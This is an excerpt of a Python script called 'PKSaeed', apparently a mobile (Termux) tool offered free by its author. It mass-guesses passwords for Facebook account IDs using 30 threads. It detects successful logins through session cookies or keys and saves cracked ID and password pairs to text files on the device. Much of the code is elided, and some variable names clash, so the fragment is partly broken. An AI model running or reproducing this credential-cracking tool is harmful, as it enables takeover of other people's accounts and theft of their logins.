...
----------------------------------------------
 Github    : Veero302
 Facebook  : Saeed Ullah
 Tool Name : PKSaeed
 Type type : NO PAID THIS FREE
 Version   : 1.0.0
----------------------------------------------
 Veero Pro version 1.0.0
 Dad Of All: Name Tho Suna Hoga Saeed Dada
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def gmail():
                ...
                with tred(max_workers=30) as Veero:
                        ...
                        for user in fo:
                               ...
                               PKSaeed.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                     ...
                     PKSaeed=session.cookies.get_dict().keys()
                        if "c_user" in PKSaeed:
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in PKSaeed:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [PKSaeed-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/PKSaeed-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/PKSaeed-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [PKSaeed-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/PKSaeed-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [PKSaeed-OK] '+uid+' | '+pas+'\033[1;97m')
